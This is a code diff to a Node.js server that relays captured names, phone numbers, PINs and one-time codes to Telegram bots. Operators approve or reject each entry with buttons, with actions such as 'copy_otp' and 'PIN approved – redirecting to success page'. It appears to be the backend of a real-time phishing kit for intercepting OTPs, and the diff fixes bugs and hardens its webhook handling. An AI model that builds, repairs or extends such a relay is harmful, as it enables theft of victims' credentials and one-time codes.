@@ -51,14 +51,33 @@ const store = {
 
   async get(kind, id) {
     const key = `req:${kind}:${id}`;
-    if (redis) return await redis.get(key);
-    const entry = memStore.get(key);
-    if (!entry) return null;
-    if (entry.expiresAt < Date.now()) {
-      memStore.delete(key);
-      return null;
+    let raw;
+
+    if (redis) {
+      raw = await redis.get(key);
+    } else {
+      const entry = memStore.get(key);
+      if (!entry) return null;
+      if (entry.expiresAt < Date.now()) {
+        memStore.delete(key);
+        return null;
+      }
+      raw = entry.data;
     }
-    return entry.data;
+
+    // Defensive: some Redis clients return a JSON string.
+    if (typeof raw === 'string') {
+      try { raw = JSON.parse(raw); } catch { return null; }
+    }
+
+    // Defensive: normalise the shape so callers always see
+    // { meta, status } with status being null | true | false.
+    if (!raw || typeof raw !== 'object') return null;
+
+    return {
+      meta: raw.meta || {},
+      status: (raw.status === true || raw.status === false) ? raw.status : null
+    };
   }
 };
 
@@ -85,7 +104,6 @@ function getBot(botId) {
 }
 
 // ---------- FORMATTING ----------
-// Every Telegram notification uses this so name + phone always appear.
 function userHeader(name, phone) {
   return `👤 Name: ${name || '—'}\n📞 Phone: ${phone || '—'}`;
 }
@@ -289,6 +307,7 @@ app.get('/check-pin/:id', async (req, res) => {
 app.post('/telegram-webhook/:botId', async (req, res) => {
   console.log('🔥 WEBHOOK HIT:', req.params.botId);
 
+  // Always answer Telegram with 200 quickly. Handle errors below.
   try {
     const bot = getBot(req.params.botId);
     if (!bot) {
@@ -296,14 +315,16 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
       return res.sendStatus(200);
     }
 
-    const cb = req.body.callback_query;
-    if (!cb) {
+    const cb = req.body && req.body.callback_query;
+    if (!cb || !cb.data) {
       return res.sendStatus(200);
     }
 
-    console.log(`📩 Received callback: ${cb.data} from ${cb.from.id}`);
+    console.log(`📩 Received callback: ${cb.data} from ${cb.from && cb.from.id}`);
 
-    const [action, requestId] = cb.data.split(':');
+    const parts = cb.data.split(':');
+    const action = parts[0];
+    const requestId = parts[1];
     const kind = kindFromAction(action);
 
     if (!kind || !requestId) {
@@ -312,6 +333,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     }
 
     const entry = await store.get(kind, requestId);
+    console.log(`🔎 Store lookup ${kind}:${requestId} ->`, JSON.stringify(entry));
 
     if (!entry) {
       console.warn(`⏳ Request ${requestId} (${kind}) not found — expired or never existed`);
@@ -322,7 +344,8 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
       return res.sendStatus(200);
     }
 
-    if (entry.status !== null) {
+    // Correct check: only treat as processed if status is exactly true/false
+    if (entry.status === true || entry.status === false) {
       const msg = entry.status ? '✅ already approved' : '❌ already rejected';
       await answerCallback(bot, cb.id, {
         text: `⏳ This request was ${msg}.`,
@@ -331,6 +354,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
       return res.sendStatus(200);
     }
 
+    // Special action: copy OTP
     if (action === 'copy_otp') {
       if (entry.meta && entry.meta.otp) {
         await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
@@ -354,7 +378,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     if (action === 'pin_ok')    { newStatus = true;  feedback = '✅ PIN approved – redirecting to success page'; }
     if (action === 'pin_bad')   { newStatus = false; feedback = '❌ PIN rejected'; }
 
-    if (newStatus === null && !feedback) {
+    if (newStatus === null) {
       await answerCallback(bot, cb.id, { text: 'Unknown action.', show_alert: true });
       return res.sendStatus(200);
     }
@@ -362,23 +386,21 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     entry.status = newStatus;
     await store.save(kind, requestId, entry);
 
-    if (feedback) {
-      await sendTelegram(
-        bot,
-        `📝 ACTION TAKEN\n${userHeader(entry.meta?.name, entry.meta?.phone)}\n${feedback}`
-      );
-    }
+    await sendTelegram(
+      bot,
+      `📝 ACTION TAKEN\n${userHeader(entry.meta.name, entry.meta.phone)}\n${feedback}`
+    );
 
     await answerCallback(bot, cb.id);
     console.log(`✅ Processed callback for ${requestId} -> ${feedback}`);
-    res.sendStatus(200);
+    return res.sendStatus(200);
 
   } catch (err) {
     console.error('🔥 Webhook handler crashed:', err.message);
 
     try {
-      const cb = req.body?.callback_query;
-      if (cb) {
+      const cb = req.body && req.body.callback_query;
+      if (cb && cb.id) {
         const bot = getBot(req.params.botId);
         if (bot) {
           await answerCallback(bot, cb.id, {
@@ -389,7 +411,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
       }
     } catch {}
 
-    res.sendStatus(200);
+    return res.sendStatus(200);
   }
 });
 
